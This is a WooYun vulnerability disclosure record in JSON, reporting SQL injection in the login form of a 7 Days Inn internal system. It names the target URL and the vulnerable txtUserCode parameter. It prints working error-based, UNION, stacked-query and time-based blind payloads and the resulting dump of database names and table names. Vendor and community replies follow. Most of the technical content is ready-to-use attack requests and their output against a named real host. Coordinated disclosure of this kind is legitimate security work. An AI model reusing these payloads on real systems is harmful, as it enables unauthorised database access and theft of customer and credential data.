{"id": 14660, "wybug_id": "wooyun-2012-016577", "wybug_title": "7天连锁酒店某系统SQL注入漏洞，重要数据库泄露", "wybug_corp": "7天连锁酒店", "wybug_author": "D＆G", "wybug_date": "2012-12-27 10:28", "wybug_open_date": "2013-02-10 10:29", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-10：\t细节向公众公开  简要描述： 没有过滤，导致注入。 详细说明：  http://itpm.7daysinn.cn:7709/login.aspx登录处，用户名\nServer Error in '/' Application.字符串 ''' 后的引号不完整。''' 附近有语法错误。Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.Exception Details: System.Web.Services.Protocols.SoapException: 字符串 ''' 后的引号不完整。''' 附近有语法错误。Source Error:An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.\n\nPlace: POSTParameter: txtUserCode    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __LASTFOCUS=&__VIEWSTATE=/wEPDwULLTIxMDQzNDM2MjFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQdidG5TZXZlxQ34OR4Hc5DCtkioH9GxM7ZxkE0=&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBQLA9Z7LBQKj1dLzBwK9+7qcDgKP/fS7AwKgt7iSDIiFFrClKvEL9HLzq+KJEHAcHct7&txtUserCode=admin' AND 2322=CONVERT(INT,(CHAR(58)+CHAR(101)+CHAR(118)+CHAR(108)+CHAR(58)+(SELECT (CASE WHEN (2322=2322) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(116)+CHAR(114)+CHAR(58))) AND 'wwRa'='wwRa&txtPWD=123456&txtCardCode=&btnSeve.x=93&btnSeve.y=13    Type: UNION query    Title: Generic UNION query (NULL) - 14 columns    Payload: __LASTFOCUS=&__VIEWSTATE=/wEPDwULLTIxMDQzNDM2MjFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQdidG5TZXZlxQ34OR4Hc5DCtkioH9GxM7ZxkE0=&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBQLA9Z7LBQKj1dLzBwK9+7qcDgKP/fS7AwKgt7iSDIiFFrClKvEL9HLzq+KJEHAcHct7&txtUserCode=admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(58)+CHAR(101)+CHAR(118)+CHAR(108)+CHAR(58)+CHAR(104)+CHAR(100)+CHAR(78)+CHAR(103)+CHAR(79)+CHAR(71)+CHAR(114)+CHAR(108)+CHAR(117)+CHAR(65)+CHAR(58)+CHAR(111)+CHAR(116)+CHAR(114)+CHAR(58),NULL,NULL,NULL,NULL,NULL,NULL-- &txtPWD=123456&txtCardCode=&btnSeve.x=93&btnSeve.y=13    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __LASTFOCUS=&__VIEWSTATE=/wEPDwULLTIxMDQzNDM2MjFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQdidG5TZXZlxQ34OR4Hc5DCtkioH9GxM7ZxkE0=&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBQLA9Z7LBQKj1dLzBwK9+7qcDgKP/fS7AwKgt7iSDIiFFrClKvEL9HLzq+KJEHAcHct7&txtUserCode=admin'; WAITFOR DELAY '0:0:5'--&txtPWD=123456&txtCardCode=&btnSeve.x=93&btnSeve.y=13    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __LASTFOCUS=&__VIEWSTATE=/wEPDwULLTIxMDQzNDM2MjFkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQdidG5TZXZlxQ34OR4Hc5DCtkioH9GxM7ZxkE0=&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=/wEWBQLA9Z7LBQKj1dLzBwK9+7qcDgKP/fS7AwKgt7iSDIiFFrClKvEL9HLzq+KJEHAcHct7&txtUserCode=admin' WAITFOR DELAY '0:0:5'--&txtPWD=123456&txtCardCode=&btnSeve.x=93&btnSeve.y=13\n\navailable databases [20]:                                                      [*] ConfigCenter[*] DBData[*] master[*] model[*] msdb[*] tempdb[*] WebFrontOffice113[*] WebFrontOffice114[*] WebFrontOffice115[*] WebFrontOffice116[*] WebFrontOffice117[*] WebFrontOffice118[*] WebFrontOffice119[*] WebFrontOffice120[*] WebFrontOffice121[*] WebFrontOffice33[*] WebFrontOffice34[*] WebFrontOffice39[*] WebFrontOffice40[*] WebFrontOffice63\n\nDatabase: ConfigCenter                                                         [40 tables]+------------------------+| dbo.AppSystem          || dbo.Authenticate       || dbo.CheckCodeRecord    || dbo.City               || dbo.DBConnString       || dbo.DataSchema         || dbo.DataSchemaField    || dbo.DataSchemaSecurity || dbo.District           || dbo.GroupOwnRoles      || dbo.Inn                || dbo.InnChangeLog       || dbo.Inn_tmp            || dbo.PCMachine          || dbo.Passport           || dbo.Region             || dbo.Roles              || dbo.ServiceSystem      || dbo.ServiceURL         || dbo.ServiceURL1        || dbo.ServiceURL11       || dbo.ServiceURL12       || dbo.ServiceURL16       || dbo.ServiceURL17       || dbo.ServiceURL18       || dbo.ServiceURL2        || dbo.ServiceURL3        || dbo.ServiceURL4        || dbo.ServiceURL5        || dbo.ServiceURL6        || dbo.ServiceURL7        || dbo.ServiceURL8        || dbo.SoftwareVersion    || dbo.SwitchStep         || dbo.User               || dbo.UserKeyCard        || dbo.UserOnwRoles       || dbo.UserRoleGroup      || dbo.sys_Kalendar       || dbo.sysdiagrams        |+------------------------+\n   漏洞证明：  \n\n   修复方案：  因为感觉这个数据库内容比较重要，所以选了20.由于个人水平原因没有继续测试。第一时间发上来了。   版权声明：转载请注明来源 D＆G@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-12-27 10:31 厂商回复： 谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-27 10:32 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  厂商好迅速啊    \n     2012-12-27 15:43 |    \t\t7天连锁酒店(乌云厂商)\t\t \n  此系统已经下线做全面修补。我们一贯重视并感谢乌云提供的这个平台 也非常感谢大家给出的漏洞     \n     2012-12-27 15:46 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @7天连锁酒店 好赞的厂商！给力    \n     2012-12-27 20:33 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @疯狗 @7天连锁酒店 都很给力嘛    \n     2013-01-26 12:34 |    \t\t小黑 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | <param name=\"wmode\" value=\"transparent\">...)\t\t \n  Server Error in '/' Application. -------------------------------------------------------------------------------- Timeout expired.  The timeout period elapsed prior to obtaining a connection from the pool.  This may have occurred because all pooled connections were in use and max pool size was reached. Description: An unhandled exception occurred during the execution of the cur…    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}